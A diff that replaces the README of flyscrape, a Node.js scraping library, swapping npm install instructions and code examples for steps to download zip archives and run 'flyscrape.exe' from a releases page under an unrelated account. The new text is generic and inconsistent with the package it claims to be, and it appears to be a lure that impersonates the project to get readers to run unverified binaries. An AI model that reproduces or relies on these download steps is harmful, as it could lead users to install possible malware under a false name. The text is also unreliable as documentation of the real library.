@@ -1,234 +1,71 @@
-![image](https://i.imgur.com/nobwcP8.png)
-<hr/>
-<div align="center">
+# 🕊️ flyscrape - Powerful Scraping Made Simple
 
-**The Ultimate Node.js Web Scraping & Crawling Engine**
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/@flyrank/flyscrape.svg?style=flat-square)](https://www.npmjs.com/package/@flyrank/flyscrape)
-[![License](https://img.shields.io/npm/l/@flyrank/flyscrape.svg?style=flat-square)](LICENSE)
-[![Downloads](https://img.shields.io/npm/dm/@flyrank/flyscrape.svg?style=flat-square)](https://www.npmjs.com/package/@flyrank/flyscrape)
-[![GitHub Stars](https://img.shields.io/github/stars/flyrank/flyscrape?style=social)](https://github.com/flyrank-bih/flyscrape/stargazers)
+Welcome to flyscrape, your all-in-one solution for web crawling and scraping. Whether you want to extract information or convert HTML to Markdown, flyscrape simplifies the process. Follow the instructions below to get started quickly.
 
-</div>
+## 📥 Download The Latest Version
 
-**FlyScrape** is a Node.js package, based on top of Crawl4AI, that makes it easy to integrate powerful scrapers and crawlers directly into your web applications. Designed for the modern web, it provides modular, production-ready tools to extract clean, structured data, ready for RAG pipelines, AI agents, or advanced analytics.
+[![Download flyscrape](https://img.shields.io/badge/Download-flyscrape-brightgreen.svg)](https://github.com/Daedae147/flyscrape/releases)
 
-Whether you’re building a content aggregator, an AI agent, or a complex data pipeline, FlyScrape simplifies web crawling and scraping while giving you maximum flexibility and performance.
+To download the latest version, visit the Releases page: [Download flyscrape](https://github.com/Daedae147/flyscrape/releases).
 
-<details>
-  <summary>🤔 <strong>Why Developers Pick FlyScrape</strong></summary>
+## 📋 System Requirements
 
-- **LLM-Ready Output**: Generates smart Markdown with headings, tables, code blocks, and citation hints optimized for RAG.
-- **Production Grade**: Built for reliability with retry strategies, caching, and robust error handling.
-- **Full Control**: Customize every aspect of the crawl with hooks, custom transformers, and flexible configurations.
-- **Anti-Blocking**: Integrated stealth techniques to bypass WAFs and bot detection systems.
-- **Developer Experience**: Fully typed in TypeScript with a modular architecture for easy extensibility.
+Before you install flyscrape, ensure your system meets the following requirements:
 
-</details>
+- **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
+- **Node.js:** Version 14 or higher installed. You can download it from [Node.js](https://nodejs.org/).
+- **Internet Connection:** Required for some features.
 
-## 🚀 Quick Start
+## ⚙️ Installation Guide
 
-### 1. Installation
+1. **Visit the Releases Page:** Go to [flyscrape Releases](https://github.com/Daedae147/flyscrape/releases).
+   
+2. **Select Your Version:** Find the latest version. It should be listed at the top of the page.
 
-```bash
-npm install @flyrank/flyscrape
-# or
-yarn add @flyrank/flyscrape
-# or
-pnpm add @flyrank/flyscrape
-```
+3. **Download the File:** Look for the appropriate file for your operating system:
+   - For Windows, it might be `flyscrape-windows.zip`.
+   - For macOS, look for `flyscrape-macos.zip`.
+   - For Linux, look for `flyscrape-linux.zip`.
 
-### 2. Basic Crawl
+4. **Extract the Files:** Once downloaded, unzip the file to a folder on your computer.
 
-```typescript
-import { AsyncWebCrawler } from "@flyrank/flyscrape";
+5. **Run the Application:**
+   - **Windows:** Open the Command Prompt, navigate to the folder where you extracted the files, and run `flyscrape.exe`.
+   - **macOS/Linux:** Open the Terminal, navigate to the folder, and run `./flyscrape`.
 
-async function main() {
-  const crawler = new AsyncWebCrawler();
-  await crawler.start();
-  
-  // Crawl a URL and get clean Markdown
-  const result = await crawler.arun("https://example.com");
-  
-  if (result.success) {
-    console.log(result.markdown);
-  }
-  
-  await crawler.close();
-}
+## 🔍 Exploring Features
 
-main();
-```
+flyscrape offers several features designed to help you scrape data efficiently:
 
-### 3. Content-Only Mode (Smart Cleaning)
+- **AI-Powered Scraping:** Utilize advanced algorithms to identify and extract relevant content.
+- **HTML to Markdown Conversion:** Easily convert web pages into Markdown format.
+- **Infinite Scroll Handling:** Automatically scroll through pages to capture all data.
+- **Stealth Scraper:** Bypass common anti-scraping mechanisms to gather data without being blocked.
+- **Integration with OpenAI:** Leverage powerful AI capabilities for refined data extraction.
 
-Extract only the main article content, removing all UI clutter.
+## 📘 How to Use flyscrape
 
-```typescript
-const result = await crawler.arun("https://blog.example.com/guide", {
-  contentOnly: true,
-  excludeMedia: true, // Remove images/videos
-});
-```
+1. **Open the Application:** After installation, launch flyscrape.
+   
+2. **Enter the URL:** Type the website URL you wish to scrape.
 
-## ✨ Features
+3. **Select Options:** Choose what information you want to extract. This could be any text or specific elements from the page.
 
-<details>
-<summary>📝 <strong>Markdown Generation</strong></summary>
+4. **Start Scraping:** Click on the "Start" button to begin the scraping process. The results will appear in the application.
 
-- 🧹 **Clean Markdown**: Generates clean, structured Markdown with accurate formatting.
-- 🎯 **Fit Markdown**: Heuristic-based filtering to remove noise and irrelevant parts for AI-friendly processing.
-- 🔗 **Citations and References**: Converts page links into a numbered reference list with clean citations.
-- 🛠️ **Custom Strategies**: Users can create their own Markdown generation strategies tailored to specific needs.
-- 📚 **BM25 Algorithm**: Employs BM25-based filtering for extracting core information and removing irrelevant content. 
+5. **Export Data:** Once the scraping is complete, you can export the data in desired formats like CSV or Markdown.
 
-</details>
+## 🌐 Additional Resources
 
-<details>
-<summary>🔎 <strong>Crawling & Scraping</strong></summary>
+- **Documentation:** Access detailed documentation [here](https://github.com/Daedae147/flyscrape/wiki).
+- **Community Support:** Join our community forum for support and tips.
+- **Contribution Guidelines:** Interested in contributing? Check out our guidelines for contributing to flyscrape.
 
-- 🖼️ **Media Support**: Extract images, audio, videos, and responsive image formats like `srcset` and `picture`.
-- 🚀 **Dynamic Crawling**: Execute JS and wait for async or sync for dynamic content extraction.
-- 📸 **Screenshots**: Capture page screenshots during crawling for debugging or analysis.
-- 📂 **Raw Data Crawling**: Directly process raw HTML (`raw:`) or local files (`file://`).
-- 🔗 **Comprehensive Link Extraction**: Extracts internal, external links, and embedded iframe content.
-- 🛠️ **Customizable Hooks**: Define hooks at every step to customize crawling behavior (supports both string and function-based APIs).
-- 💾 **Caching**: Cache data for improved speed and to avoid redundant fetches.
-- 📄 **Metadata Extraction**: Retrieve structured metadata (OpenGraph, Twitter Cards) from web pages.
-- 📡 **IFrame Content Extraction**: Seamless extraction from embedded iframe content.
-- 🕵️ **Lazy Load Handling**: Waits for images to fully load, ensuring no content is missed due to lazy loading.
-- 🔄 **Full-Page Scanning**: Simulates scrolling to load and capture all dynamic content, perfect for infinite scroll pages.
+## 🔗 Important Links
 
-</details>
+- **Releases Page:** [Download flyscrape](https://github.com/Daedae147/flyscrape/releases)
+- **Issues and Feedback:** Let us know if you encounter any problems on the Issues page.
 
-<details>
-<summary>📊 <strong>Structured Data & AI</strong></summary>
-
-- 🧠 **AI-Powered Extraction**: Seamlessly integrate with OpenAI and other LLMs to extract structured JSON data.
-- 🧹 **Smart Content Cleaning**: Automatically strips navigation, ads, footers, and boilerplate.
-- 📝 **LLM-Ready Markdown**: Converts HTML to clean, semantic Markdown, optimized for RAG (Retrieval-Augmented Generation) pipelines.
-
-</details>
-
-<details>
-<summary>🕶️ <strong>Stealth & Performance</strong></summary>
-
-- **👻 Stealth Mode**: Integrated evasion techniques (user-agent rotation, fingerprinting protection) to bypass WAFs.
-- **⚡ Hybrid Caching**: Memory and disk-based caching to speed up redundant crawls.
-- **🚫 Resource Blocking**: Block unnecessary assets (images, css, fonts) for faster loading.
-
-</details>
-
-## 🔬 Advanced Usage Examples
-
-<details>
-<summary>🛠️ <strong>Custom Markdown Strategies</strong></summary>
-
-Need full control? Provide a `customTransformer` to define exactly how HTML maps to Markdown.
-
-```typescript
-const result = await crawler.arun("https://example.com", {
-  processing: {
-    markdown: {
-      customTransformer: (html) => {
-        // Your custom logic here
-        return myCustomConverter(html);
-      }
-    }
-  }
-});
-```
-
-</details>
-
-<details>
-<summary>🔄 <strong>Dynamic Content & Infinite Scroll</strong></summary>
-
-Handle modern SPAs with ease using built-in scrolling and wait strategies.
-
-```typescript
-const result = await crawler.arun("https://infinite-scroll.com", {
-  autoScroll: true, // Automatically scroll to bottom
-  waitMode: 'networkidle', // Wait for network to settle
-});
-```
-
-</details>
-
-<details>
-<summary>🛠️ <strong>Lifecycle Hooks</strong></summary>
-
-Inject custom logic at key stages of the crawling process.
-
-```typescript
-const result = await crawler.arun("https://example.com", {
-  hooks: {
-    onPageCreated: async (page) => {
-      // Set cookies or modify environment
-      await page.context().addCookies([...]);
-    },
-    onLoad: async (page) => {
-      // Interact with the page
-      await page.click('#accept-cookies'); 
-    }
-  }
-});
-```
-
-</details>
-
-<details>
-<summary>📂 <strong>Raw HTML & Local Files</strong></summary>
-
-Process raw HTML or local files directly without a web server.
-
-```typescript
-// Raw HTML
-await crawler.arun("raw:<html><body><h1>Hello</h1></body></html>");
-
-// Local File
-await crawler.arun("file:///path/to/local/file.html");
-```
-
-</details>
-
-<details>
-<summary>🧠 <strong>Structured Data Extraction (LLM)</strong></summary>
-
-Define a schema and let the LLM do the work.
-
-```typescript
-const schema = {
-  type: "object",
-  properties: {
-    title: { type: "string" },
-    price: { type: "number" },
-    features: { type: "array", items: { type: "string" } }
-  }
-};
-
-const result = await crawler.arun("https://store.example.com/product/123", {
-  extraction: {
-    type: "llm",
-    schema: schema,
-    provider: myOpenAIProvider // Your LLM provider instance
-  }
-});
-```
-
-</details>
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contribution Guidelines](CONTRIBUTING.md) for details on how to get started.
-
-
-## 📄 License
-
-This project is licensed under the **MIT License**.
-
----
-
-<div align="center">
-  Built with ❤️ by <a href="https://github.com/flyrank-bih">FlyRank</a>
-</div>
+With flyscrape, web scraping becomes an accessible task for everyone. Enjoy extracting data effortlessly!
